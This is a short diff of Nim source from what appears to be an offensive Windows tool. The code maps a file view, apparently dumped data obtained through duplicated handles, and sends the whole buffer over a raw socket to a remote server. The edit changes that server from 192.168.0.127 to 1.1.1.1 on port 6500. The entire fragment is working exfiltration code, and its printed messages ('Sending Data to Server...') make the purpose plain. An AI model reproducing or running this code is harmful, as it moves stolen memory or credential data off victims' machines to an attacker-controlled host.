@@ -284,16 +284,17 @@ when isMainModule:
     var mappedData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
     echo "\n[!] Mapped Data at: 0x", repr mappedData, " - Size: ", size
     
-    var dataPointer = mappedData
-    var dumpSeq: seq[byte] = @[]
+    #var dataPointer = mappedData
+    #var dumpSeq: seq[byte] = @[]
     #var countDP: int = 1
     let socket = newSocket()
-    socket.connect("192.168.0.127", Port(6500))
+    socket.connect("1.1.1.1", Port(6500))
 
     echo "[!] Sending Data to Server..."
-    discard socket.send(dataPointer, size)
+    discard socket.send(mappedData, size)
 
     echo "\n[!] Cleaning Up..."
+    UnmapViewOfFile(mappedData)
     #discard readLine(stdin)
     for handleTuple in dupHandlesSeq: CloseHandle(handleTuple[1])
     
